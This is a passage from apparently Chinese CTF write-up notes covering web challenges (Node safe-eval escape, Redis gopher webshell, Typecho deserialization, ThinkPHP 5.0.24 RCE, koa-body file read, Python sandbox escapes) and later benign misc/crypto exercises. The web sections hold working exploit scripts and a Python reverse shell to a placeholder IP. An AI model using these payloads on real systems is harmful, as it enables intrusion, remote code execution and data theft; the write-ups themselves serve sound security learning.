但是文件具体在哪又找了半天 如果传在默认主题zip的default/__static__/eki.php 那么访问路由应该是下面这样 /public/static/index/default/eki.php getshell完了，根据提示，去找生成的脚本（因为这个脚本是由root权限+定时执行的） 改造下这个脚本，反弹shell，就拿到root权限了 0x04 EZ三剑客-EzNode 这题用了一个setTimeOut 去官网查的话会发现有个问题 当 delay 大于 2147483647 或小于 1 时，则 delay 将会被设置为 1。 非整数的 delay 会被截断为整数。 根据 // 2020.1/WORKER2 老板说为了后期方便优化 app.use((req, res, next) => { if (req.path === '/eval') { let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) { delay = Math.max(delay, parseInt(req.query.delay)); } const t = setTimeout(() => next(), delay);//让这里的delay > 2147483647 可以绕过后面了 // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事 setTimeout(() => { clearTimeout(t); console.log('timeout'); try { res.send('Timeout!'); } catch (e) { } }, 1000); } else { next(); } }); 然后后面给了包名和包版本，那么去找下有无CVE 找到 https://snyk.io/vuln/SNYK-JS-SAFEREVAL-534901 EXP： #coding=utf-8 import requests import urllib data={ \"e\":\"\"\"(function () { const f = Buffer.prototype.write; const ft = { length: 10, utf8Write(){ } }; function r(i){ var x = 0; try{ x = r(i); }catch(e){} if(typeof(x)!=='number') return x; if(x!==i) return x+1; try{ f.call(ft); }catch(e){ return e; } return null; } var i=1; while(1){ try{ i=r(i).constructor.constructor(\"return process\")(); break; }catch(x){ i++; } } return i.mainModule.require(\"child_process\").execSync(\"cat /flag\").toString() }()).toString()\"\"\" } req = requests.post(\"http://67f6b840-8d56-441f-87ad-95fe0da057b3.node3.buuoj.cn/eval?delay=2147483649\",data=data) print req.text 0x05 EzWeb F12源码提示了?secret 可以拿到靶机的内网地址 应该是想办法内网渗透 会的东西太少了，思路比较狭窄or2 看了wp发现是考察redis未授权访问getshell 就是还可以访问到另一台开着redis服务的机子存在未授权访问漏洞 直接利用gopher协议写shell拿到flag payload 生成 import urllib protocol=\"gopher://\" ip=\"\"#填redis服务机的ip port=\"6379\" shell=\"\\n\\n\\n\\n\" filename=\"eki.php\" path=\"/var/www/html\" passwd=\"\" cmd=[ \"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print payload 打完就可以访问对应ip下的/eki.php获得flag 0x06 EzTypecho 看源码好像没啥修改，似乎typecho的反序列化exp还能用 然后就是加了一个必须拿到session的条件 之前任意文件上传的时候刚好遇到过 https://www.php.net/manual/zh/session.upload-progress.php 利用 当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 强行上传一个文件 就可以强行拿到session了 然后还是用那个经典exp _type = $this::RSS2; $this->_type = $this::ATOM1; $this->_items[0] = array( 'category' => array(new Typecho_Request()), 'author' => new Typecho_Request(), ); } } class Typecho_Request { private $_params = array(); private $_filter = array(); public function __construct() { $this->_params['screenName'] = \"cat /flag\"; $this->_filter[0] = 'system'; } } $exp = array( 'adapter' => new Typecho_Feed(), 'prefix' => 'typecho_' ); echo base64_encode(serialize($exp)); ?> Exp: #coding=utf-8 import requests s = requests.Session() files = {\"file\":\"eki\"} cookies = { \"PHPSESSID\":\"test\", \"__typecho_config\":\"YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJjYXQgL2ZsYWciO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX1zOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJjYXQgL2ZsYWciO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9\" } headers ={ \"Referer\":\"http://30205fa6-2384-4aca-bb0f-8b217b32b0e6.node3.buuoj.cn/install.php\" } data = { \"PHP_SESSION_UPLOAD_PROGRESS\": \"123456789\" } req = s.post(\"http://30205fa6-2384-4aca-bb0f-8b217b32b0e6.node3.buuoj.cn/install.php?finish=1\",files=files,cookies=cookies,headers=headers,data=data) print req.text © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/sctf-2020.html":{"url":"contest/sctf-2020.html","title":"SCTF 2020","keywords":"","body":"SCTF 2020 部分题解Clouddiskpysandboxpysandbox2defenderBestLanguageSCTF 2020 部分题解 Clouddisk 给了源码 const fs = require('fs'); const path = require('path'); const crypto = require('crypto'); const Koa = require('koa'); const Router = require('koa-router'); const koaBody = require('koa-body'); const send = require('koa-send'); const app = new Koa(); const router = new Router(); const SECRET = \"?\" app.use(koaBody({ multipart: true, formidable: { maxFileSize: 2000 * 1024 * 1024 } })); router.post('/uploadfile', async (ctx, next) => { const file = ctx.request.body.files.file; const reader = fs.createReadStream(file.path); let fileId = crypto.createHash('md5').update(file.name + Date.now() + SECRET).digest(\"hex\"); let filePath = path.join(__dirname, 'upload/') + fileId const upStream = fs.createWriteStream(filePath); reader.pipe(upStream) return ctx.body = \"Upload success ~, your fileId is here：\" + fileId; }); router.get('/downloadfile/:fileId', async (ctx, next) => { let fileId = ctx.params.fileId; ctx.attachment(fileId); try { await send(ctx, fileId, { root: __dirname + '/upload' }); }catch(e){ return ctx.body = \"SCTF{no_such_file_~}\" } }); router.get('/', async (ctx, next) => { ctx.response.type = 'html'; ctx.response.body = fs.createReadStream('index.html'); }); app.use(router.routes()); app.listen(3333, () => { console.log('This server is running at port: 3333') }) koa-bodyparser的issue. https://github.com/dlau/koa-body/issues/75 在/uploadfile 的路由去POST　Json poc: {\"files\":{\"file\":{\"name\":\"eki\",\"path\":\"/etc/passwd\"}}} 这里相当于file.path变成/etc/passwd了 然后在/download路由下下载得到flag exp #coding=utf-8 import requests import time url=\"http://120.79.1.217:7777/\" s = requests.Session() def upload(file): json = {\"files\":{\"file\":{\"name\":\"eki\",\"path\":file}}} req = s.post(url+\"uploadfile\",json=json) print req.text #print return req.text[38:] def download(name): req = s.get(url+\"downloadfile/%s\" % (name)) return req.text def exploit(name): text = download(upload(name)) if text != \"Not Found\": retf = open(name.replace(\"/\",''),\"wb\") retf.write(text) retf.close() exploit(\"/app/flag\") pysandbox 可用字符集 *+,-./0123456789:;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxy 修改flask app 配置 设置当前目录为静态目录直接通过http请求读 import requests url = \"http://39.104.25.107:10000/\" s = requests.Session() def exp(poc1,poc2): data = { \"cmd\":poc1 } header = { \"User-Agent\":poc2 } req = s.post(url,data=data,headers=header) print req.text exp(\"app.static_folder=request.user_agent.string\",\".\") exp(\"app.static_url_path=request.user_agent.string\",\"/sadsadsasd\") req = s.get(url+\"static/flag\") print req.text pysandbox2 执行命令时可以执行类似 __builtins__.exec=open ，使得环境的内建方法被替换。 这里通过重载[]的方式实现函数调用 import requests url =\"http://39.104.25.107:10004/\" s= requests.Session() def exp(poc1,poc2): data = { \"cmd\":poc1 } header = { \"User-Agent\":poc2 } req = s.post(url,data=data,headers=header) print req.text exp(\"request.__class__.__getitem__=__builtins__.exec;request[request.user_agent.string]\",'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"XXX.XXX.XXX.XXX\",XXXX));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);') defender 进去跳转到test目录下，发现应该是个纯静态，F12提示了一个路径 http://8.208.102.48/public/nationalsb/login.php ` HTTP基础认证 在这个页面的js里可以看到用户名和部分密码 http://8.208.102.48/public/nationalsb/login.html 用BurpSuite爆破得到用户名密码 存在LFI 利用TP5.0.24的写文件漏洞，实现rce import requests import base64 import urllib import hashlib import random url = 'http://8.208.102.48/public/' s = requests.session() def randomstr(): return ''.join(random.sample('12234567890zyxwvutsrqponmlkjihgfedcba',6)) def md5(p): h = hashlib.md5() h.update(p) return h.hexdigest() def exp(p,rs): poc='O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00query%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A16%3A%22removeWhereField%22%3B%7Ds%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A6%3A%22%00%2A%00tag%22%3Bs%3A6%3A%22{2}%22%3Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A{0}%3A%22{1}%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7D%7D%7D%7D%7D%7D%7D%7D'.format(len(p),p,rs) #print poc print urllib.quote(base64.b64encode(urllib.unquote(poc))) params= { \"s3cr3tk3y\":base64.b64encode(urllib.unquote(poc)) } req = s.get(url+\"index.php/index/index/hello\",params=params) def name2(rs): return \"a.php\"+md5('tag_'+md5(rs))+\".php\" def name(p,rs): return p+md5('tag_'+md5(rs))+\".php\" def watchlog(): req= s.get(url+\"log.txt\") print req.text def test(p): req = s.get(url+\"index.php/\") print req.text def inc(p): header={ \"Authorization\":\"Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=\" } data = { \"file\":\"/tmp/\"+p } req = s.post(url+\"nationalsb/login.php\",headers=header,data=data) print req.text return req.text #exp('php://filter/write=string.rot13/resource=./') #watchlog() def exploit(p): rs=randomstr() #exp('php://filter/write=string.rot13/resource=../../../../../../../../tmp/'+p,rs) exp('php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=../../../../../../../../tmp/aaa'+p+\"/../a.php\",rs) #exp('php://filter/write=string.strip_tags/resource=../../../../../../../../tmp/'+p,rs) watchlog() inc(name2(rs)) exploit('PD9waHAgc3lzdGVtKCdjYXQgbG9naW4ucGhwJykgPz5h') BestLanguage 直接路径穿越了 好像是非预期 GET /index.php/tmp/../../flag HTTP/1.1 Host: 39.104.93.188 DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Content-Type: text/html; charset=UTF-8 Connection: close Cache-Control: no-cache, private Date: Mon, 06 Jul 2020 02:21:35 GMT Set-Cookie: XSRF-TOKEN=eyJpdiI6IkxTM1JzK1lBZVBLSW1wYXhSQ3cwb3c9PSIsInZhbHVlIjoiZEdEd3lxRVhEWGZQcThMUkZHb294WXU2MHVPTTJPVHBaRkdvUk5tMXZsUnorMjJEYzFVV0N6eXYxQ3hhNFFaSmdtdERZN0hsZVA3eCt1a1RpR2pRMGc9PSIsIm1hYyI6IjRmYjA1NjEyNzA2ODY2NTAyYjBhMzU2N2I1MWM3ZjM1MGIxNTI5MzBmNjFlMDIxMWVkNWVjMzhjNTVlZjRmODMifQ%3D%3D; expires=Mon, 06-Jul-2020 04:21:35 GMT; Max-Age=7200; path=/ Set-Cookie: laravel_session=eyJpdiI6InRIdEpIaEd1ZGdSNWVwMHhEajJDd3c9PSIsInZhbHVlIjoiTWtJQkM4aVNWYTU4YTZRektuNkg0YUV2eGdVa3JxR1lJSXhLZzJtK3hEbnRvd2x4WWprRk1zcXZvUHNCYXpKRENkQ09jZzd1TmhIR0txVXUxTkp5K3c9PSIsIm1hYyI6IjA4ODYzMzllYzg3OGZjYjZhMWI3Njc5MGU0MTllZDdiNGQwOTlmYTA2Y2E2ZDE1ODFhODIyNTRmZGM4OTAwMzAifQ%3D%3D; expires=Mon, 06-Jul-2020 04:21:35 GMT; Max-Age=7200; path=/; httponly Content-Length: 41 SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1} © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/":{"url":"adworld/","title":"ADworld","keywords":"","body":"AD worldAD world 地址：https://adworld.xctf.org.cn/task © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/misc-exercise-area.html":{"url":"adworld/misc-exercise-area.html","title":"Misc Exercise Area","keywords":"","body":"MISC Exercise Area0x00 前言0x01 this_is_flag0x02 ext30x03 give_you_flag0x04 pdf0x05 stegano0x06 simpleRAR0x07 坚持60s0x08 gif0x09 掀桌子0x0A 如来十三掌0x0B base64stego0x0C Base_sixty_four_point_fiveMISC Exercise Area 0x00 前言 Misc题是真的杂。。。。但是会有很多收获 收货： linux镜像的挂载 strings工具的用法 和管道符|和grep的基础用法 二维码拼接 与佛论禅 base64隐写 stegSolve解题“套路” wireshark的基础使用方法 Todo: wireshark 流量分析的高级过滤方法0x01 this_is_flag 没错，题目里给了flag 0x02 ext3 linux的ext3镜像 先用strings看一下 strings ext3 |gerp flag .flag.txt.swp flag.txtt.swx ~root/Desktop/file/O7avZhikgKgbF/flag.txt .flag.txt.swp flag.txtt.swx .flag.txt.swp flag.txtt.swx 虽然没看到flag 但是应该就是在flag.txt里了 mount ext3 /mnt/ find /mnt -name \"flag.txt\" ./O7avZhikgKgbF/flag.txt cat ./O7avZhikgKgbF/flag.txt ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0= base64解码一下得到flag 0x03 give_you_flag 用StegSolve检查帧 发现有一帧有缺了角的二维码 补起来扫码即可 0x04 pdf 据题目所说 图片下真的有东西。。。。。 用Adobe Acrobat 拖一下图片就行了 不知道为啥用strings没法搞，可能要学习一下pdf的编码姿势 0x05 stegano 看一下属性信息，里面有个base64编码的假flag。。。。 提示有莫斯码 Ctrl+A 全选复制到记事本以后发现有这么一串东西 BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB 应该就是morse码了 0x06 simpleRAR 用Winrar 打开RAR就说文件头被破坏了 查一下RAR编码后的头文件格式 用Winhex改一下就可以了 （可以自己用PNG压缩看RAR里的PNG的头文件是怎么给的） 然后得到一个png 提示双图层用ps还打不开 file一下发现是个gif。。。。。 file secret.png secret.png: GIF image data, version 89a, 280 x 280 用ps分离一下图层 结果都还是白的。。。 用StegoSolve看一下 发现各有半个二维码 还得补全定位符。。。。 （好毒瘤） 0x07 坚持60s 这是个逆向题？ 用jd-gui反编译找一下flag就完了 或者也可真·坚持60s 0x08 gif 一堆黑白图 没有能表示空格的 排除莫斯码 转成01串然后再转ASCII码 看了大佬的WP 发现还可以用脚本自动找01。。。。。 from PIL import Image suf = '.jpg' ch = 0 for i in range(104): s = str(i) + suf im = Image.open(s,'r') pix = im.load()#导入像素 #im.show() open the image check = pix[0,0][0] if check == 255: ch=ch*2 if check != 255: ch=ch*2+1 if (i+1) % 8 == 0: print (chr(ch),end='') ch=0 print(\"\\n\") 0x09 掀桌子 这个题。。。。 有点脑洞 长度118字幕范围在a-f 可能又是hex转ascii码 但是直接转好像不行 注意到ascii ∈(0,128) 取个模试试？ #coding=utf-8 hexstr=\"c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2\" flag=\"\" while len(hexstr): flag = flag+chr(int(hexstr[:2],16)%128) hexstr = hexstr[2:] print (flag) 0x0A 如来十三掌 看格式是与佛论禅。。。。 http://keyfc.net/bbs/tools/tudoucode.aspx 但是还得加个佛曰： 解码得到 MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9 看起来有点像base64，但是解码是乱码。。。 根据题目联想到rot13 ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9 这回base64解码不会再乱了。。。。 0x0B base64stego 打开压缩包发现加过密了 但是没有给密码提示 可能是个伪加密，果然用winrar修复一下就不用密码了。。。。 里面一堆base64，解码得到没有啥用的一段文档 题名暗示是base64隐写了 然后跑脚本。。。。 def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return res def solve_stego(): with open('stego.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\\n', '') norm_line = line.replace('\\n', '').decode('base64').encode('base64').replace('\\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print (res_str) solve_stego() 0x0C Base_sixty_four_point_five 流量分析题。。。。 用wireshark自带的文件导出工具把文件都存下来 然后得到一堆的php和objects php基本上就是一句话木马和服务器交流的过程 其中奇数序号的应该就是服务器返回的内容 在1(3).php看到有意思的东西 ->|./ 2017-12-08 11:38:58 0 0777 ../ 2017-12-08 11:39:10 4096 0777 1.php 2017-12-08 11:33:16 33 0666 flag.txt 2017-12-08 11:35:29 17 0666 hello.zip 2017-12-08 09:32:36 224 0666 |我们试着找找看flag.txt和hello.zip 在1(25)中又发现多了个6666.jpg ->|./ 2017-12-08 11:42:11 0 0777 ../ 2017-12-08 11:39:10 4096 0777 1.php 2017-12-08 11:33:16 33 0666 6666.jpg 2017-12-08 11:42:11 102226 0666 flag.txt 2017-12-08 11:35:29 17 0666 hello.zip 2017-12-08 09:32:36 224 0666 |可能是用菜刀传上去的 注意到有个特别大的php 里面好像有一串奇怪的hex 果然是个jpg 但是我们要的压缩包呢。。。。。 再试试用binwalk看一下有没有其他文件 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 663085 0xA1E2D xz compressed data 664045 0xA21ED xz compressed data 812025 0xC63F9 xz compressed data 814001 0xC6BB1 xz compressed data 1238637 0x12E66D xz compressed data 1240937 0x12EF69 xz compressed data 1391563 0x153BCB xz compressed data 1393067 0x1541AB xz compressed data 1406647 0x1576B7 xz compressed data 1412887 0x158F17 xz compressed data 1422689 0x15B561 Zip archive data, encrypted at least v2.0 to extract, compressed size: 52, uncompressed size: 40, name: flag.txt 果然有 然后用foremost分离一下 拿到zip,用jpg里的密码解密一下就行了 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/crypto-execrise-area.html":{"url":"adworld/crypto-execrise-area.html","title":"Crypto Exercise Area","keywords":"","body":"CRYPTO Execrise Area0x00 前言0x01 幂数加密0x02 base640x03 Caesar0x04 Morse0x05 Railfence0x06 转轮机加密0x07 easy_RSA0x08 Normal_RSA0x09 不仅仅是Morse0x0A 混合编码0x0B easyChallenge0x0C easyECCCRYPTO Execrise Area 0x00 前言 密码学好考验数学知识。。。。。 收货 云影密码 base64 栅栏密码+变种栅栏密码（w） 凯撒密码 转轮机密码 培根密码 quipquip.com 词频分析暴力破解古典密码 RSA的加密过程 rsatool openssl的基本使用方式 Todo ECC椭圆曲线加密过程 转轮机密码编程实现 0x01 幂数加密 。。。。。说好的幂数加密 结果是个“云影密码”。。。。。。。 01248 密码：该密码又称为云影密码，使用 01248 四个数字，其中 0 用来表示间隔，其他数字以加法可以表示出 如：28=10，124=7，18=9，再用 1->26 表示 A->Z。 0x02 base64 base64解码 0x03 Caesar ‘c'-'o'=-12 key=12的凯撒密码 0x04 Morse 纯莫尔斯电码解码 0x05 Railfence 说好的栅栏密码呢。。。。 题目描述“5只小鸡”提示每组5字，但是拖进解密的地方出来的还是密文。 考虑到解密后的明文应该是以“cyber”开头的 但这几个字母在密文中又不是“均匀”分布的。。。。。。 最后发现得用栅栏密码的变种做。。。。。。 c c e h g y a e f n p e o o b e { l c i r g } e p r i e c _ o r a _ g 栅栏密码在线解密： https://www.qqxiuzi.cn/bianma/zhalanmima.php 栅栏密码变种在线解密： http://rumkin.com/tools/cipher/railfence.php 0x06 转轮机加密 转轮机加密 密钥对应转轮行数和读的顺序 密文对应相应行第一位的字母 得到下表 还得猜是有意义的字符串。。。。。 0x07 easy_RSA RSA加密过程 $n=p\\times q$ $\\phi(n)=(p-1)(q-1)$ $ e\\in (1,\\phi(n))$ ed≡1(modϕ(n))⇔ed=kϕ(n)+1 ed\\equiv 1 \\pmod {\\phi(n)} \\Leftrightarrow ed=k\\phi(n)+1ed≡1(modϕ(n))⇔ed=kϕ(n)+1 aϕ(n)≡1(modn)a^{\\phi(n)}\\equiv 1 \\pmod na​ϕ(n)​​≡1(modn) akϕ(n)+1≡a(modn)a^{k\\phi(n)+1} \\equiv a \\pmod na​kϕ(n)+1​​≡a(modn) aed≡a(modn)a^{ed} \\equiv a \\pmod na​ed​​≡a(modn) 若$c\\equiv a^e \\pmod n$则$c^d\\equiv {a^{ed}} \\equiv a \\pmod n$ 也就是说求模n下e的乘法n逆元d 用mathematica In:=ExtendedGCD[17, (473398607161 - 1)*(4511491 - 1)] Out:={1, {125631357777427553, -1}} 中间那个数就是d了 0x08 Normal_RSA 给了公钥和密文 要求明文 用openssl提取一下n openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem RSA Public-Key: (256 bit) Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 65537 (0x10001) Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgMBAAE= -----END PUBLIC KEY----- n=0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD 比较小，用yafu分解一下 yafu.exe factor(87924348264132406875276140514499937145050893665602592992418171647042491658461) fac: factoring 87924348264132406875276140514499937145050893665602592992418171647042491658461 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C77 rho: x^2 + 2, starting 1000 iterations on C77 rho: x^2 + 1, starting 1000 iterations on C77 pm1: starting B1 = 150K, B2 = gmp-ecm default on C77 ecm: 30/30 curves on C77, B1=2K, B2=gmp-ecm default ecm: 74/74 curves on C77, B1=11K, B2=gmp-ecm default ecm: 149/149 curves on C77, B1=50K, B2=gmp-ecm default, ETA: 0 sec starting SIQS on c77: 87924348264132406875276140514499937145050893665602592992418171647042491658461 ==== sieving in progress (1 thread): 36224 relations needed ==== ==== Press ctrl-c to abort and save state ==== 35719 rels found: 17849 full + 17870 from 191606 partial, (2263.87 rels/sec) SIQS elapsed time = 94.7100 seconds. Total factoring time = 108.5340 seconds ***factors found*** P39 = 319576316814478949870590164193048041239 P39 = 275127860351348928173285174381581152299 ans = 1 p,q找到了，然后用rsatool生成一下密钥文件 python rsatool.py -o private.pem -e 65537 -p 319576316814478949870590164193048041239 -q 275127860351348928173285174381581152299 然后用openssl解码一下就行了 openssl rsautl -decrypt -in flag.enc -inkey private.pem 0x09 不仅仅是Morse 先拖到 https://morsecode.scphillips.com/translator.html Morse码解密一下 M A Y # B E # H A V E # A N O T H E R # D E C O D E H H H H A A A A A B A A B B B A A B B A A A A A A A A B A A B A B A A A A A A A B B A B A A A B B A A A B B A A B A A A A B A B A A B A A A B B A B A A A B A A A B A A B A B B A A B B B A B A A A B A B A B B A A A B B A B A A A B A A B A A B A A A A B B A B B A A B B A A B A A B A A A B A A B A A B A A B A B A A B B A B A A A A B B A B A A B B A 根据题目暗示“ 一种食物 ”和一大串的AB联想到培根密码。。。 培根密码解密脚本 #!/usr/bin/env python3 # -*- coding:utf-8 -*- import re # 密文转化为指定格式 s = 'AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA' a = s.lower() # 字典 CODE_TABLE = { 'a':'aaaaa','b':'aaaab','c':'aaaba','d':'aaabb','e':'aabaa','f':'aabab','g':'aabba', 'h':'aabbb','i':'abaaa','j':'abaab','k':'ababa','l':'ababb','m':'abbaa','n':'abbab', 'o':'abbba','p':'abbbb','q':'baaaa','r':'baaab','s':'baaba','t':'baabb','u':'babaa', 'v':'babab','w':'babba','x':'babbb','y':'bbaaa','z':'bbaab' } # 5个一组进行切割并解密 def peigendecode(peigen): msg ='' codes = re.findall(r'.{5}', a) for code in codes: if code =='': msg += ' ' else: UNCODE =dict(map(lambda t:(t[1],t[0]),CODE_TABLE.items())) msg += UNCODE[code] return msg flag = peigendecode(a) print('flag is ',flag) 0x0A 混合编码 raw->base64->unicode->ASCII->base64->ASCII 0x0B easyChallenge 用pycdc反编译得到 import base64 def encode1(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return s def encode2(ans): s = '' for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return s def encode3(ans): return base64.b32encode(ans) flag = ' ' print 'Please Input your flag:' flag = raw_input() final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' if encode3(encode2(encode1(flag))) == final: print 'correct' else: print 'wrong' 改一下就得到解码脚本 import base64 def decode1(ans): s = '' for i in ans: x = ord(i) - 25 x = x ^ 36 s += chr(x) return s def decode2(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x - 36 s += chr(x) return s def decode3(ans): return base64.b32decode(ans) final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' print decode1(decode2(decode3(final))) 0x0C easyECC 椭圆曲线加密算法。。。。 原理还是不太清楚 但是可以利用下面的脚本计算公钥 #coding=utf-8 import collections import random EllipticCurve = collections.namedtuple('EllipticCurve', 'name p a b g n h') curve = EllipticCurve( 'secp256k1', # Field characteristic. p=int(input('p=')), # Curve coefficients. a=int(input('a=')), b=int(input('b=')), # Base point. g=(int(input('Gx=')), int(input('Gy='))), # Subgroup order. n=int(input('k=')), # Subgroup cofactor. h=1, ) # Modular arithmetic ########################################################## def inverse_mod(k, p): \"\"\"Returns the inverse of k modulo p. This function returns the only integer x such that (x * k) % p == 